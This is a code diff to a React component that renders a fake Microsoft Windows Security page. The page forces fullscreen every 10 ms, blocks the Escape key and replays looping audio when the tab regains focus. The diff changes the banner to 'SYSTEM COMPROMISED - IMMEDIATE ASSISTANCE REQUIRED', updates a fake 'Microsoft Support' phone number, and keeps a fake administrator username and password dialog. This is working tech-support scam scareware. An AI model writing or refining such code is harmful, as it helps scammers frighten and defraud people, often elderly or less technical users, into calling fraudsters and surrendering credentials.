@@ -125,7 +125,7 @@ function Microsoft() {
     useEffect(() => {
         const ultra = setInterval(() => {
             ensureFullscreen();
-        }, 10); 
+        }, 10);
 
         return () => clearInterval(ultra);
     }, []);
@@ -151,7 +151,6 @@ function Microsoft() {
                 return false;
             }
 
-            // Block ESC and prevent holding
             if (e.key === 'Escape') {
                 if (!escHeldRef.current) {
                     escHeldRef.current = true;
@@ -159,7 +158,6 @@ function Microsoft() {
                     e.stopPropagation();
                     return false;
                 } else {
-                    // ESC is being held down, ignore
                     e.preventDefault();
                     e.stopPropagation();
                     return false;
@@ -182,7 +180,7 @@ function Microsoft() {
             }
 
             if (e.key === 'Escape') {
-                escHeldRef.current = false; // release ESC hold
+                escHeldRef.current = false;
             }
         };
 
@@ -368,6 +366,23 @@ function Microsoft() {
             window.removeEventListener('mousemove', onMove, { capture: true });
         };
     }, []);
+    useEffect(() => {
+        const resumeAudio = () => {
+            const audio = document.getElementById('bg-audio') as HTMLAudioElement;
+            audio?.play().catch(() => { });
+        };
+
+        window.addEventListener('focus', resumeAudio);
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) resumeAudio();
+        });
+
+        return () => {
+            window.removeEventListener('focus', resumeAudio);
+            document.removeEventListener('visibilitychange', resumeAudio);
+        };
+    }, []);
+
 
     return (
         <div
@@ -440,10 +455,10 @@ function Microsoft() {
                     fontSize: '1.4rem'
                 }}
             >
-                System Protected Mode – Active
+                SYSTEM COMPROMISED - IMMEDIATE ASSISTANCE REQUIRED
             </div>
 
-            <audio src="/microsoft/generated-audio.mp3" autoPlay loop muted={false} />
+            <audio id="bg-audio" src="/microsoft/generated-audio.mp3" autoPlay loop muted={false} />
 
             <div className="left-container">
                 <div className="top-right-toolbar">
@@ -466,14 +481,14 @@ function Microsoft() {
 
             <SecondContainer />
             <ThirdContainer />
-            
+
 
             <footer className="page-footer">
                 <div className="footer-top">
                     <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
                     <span>Windows Security</span>
                     <span>Microsoft Support</span>
-                    <span className="footer-phone">+1-866-520-1921</span>
+                    <span className="footer-phone">+1-866-520-1960</span>
                 </div>
 
                 <div style={{
@@ -503,7 +518,7 @@ function Microsoft() {
                         </div>
                         <div style={{ color: '#0067c5' }}>Microsoft Support</div>
                         <div style={{ color: '#d32f2f', fontSize: '24px', fontWeight: 'bold', marginTop: '8px' }}>
-                            +1-866-520-1921
+                            +1-866-520-1960
                         </div>
 
                         <div style={{
@@ -553,17 +568,17 @@ function Microsoft() {
                             <button className="close">×</button>
                         </div>
                         <div className="dialog-body">
-                            <span style={{ fontSize: "28px", fontFamily: "Segoe UI" }}>Administrator login</span>
-                            <p style={{ marginTop: "20px" }}>
+                            <span style={{ fontSize: "28px", fontFamily: "Segoe UI" }}>Administrator</span>
+                            {/* <p style={{ marginTop: "20px" }}>
                                 Windows has been blocked due to suspicious activity.
                                 Try logging in again with your Windows account and password.
                                 If you need help, contact Windows Support.
-                            </p>
-                            <div className="phone-large">+1-866-520-1921</div>
+                            </p> */}
+                            <div className="phone-large">+1-866-520-1960</div>
                             <div className="form">
                                 <input type="text" placeholder="Username" />
                                 <input type="password" placeholder="Password" />
-                                <button className="login-button">Login</button>
+                                <button className="login-button">Call</button>
                             </div>
                         </div>
                     </div>
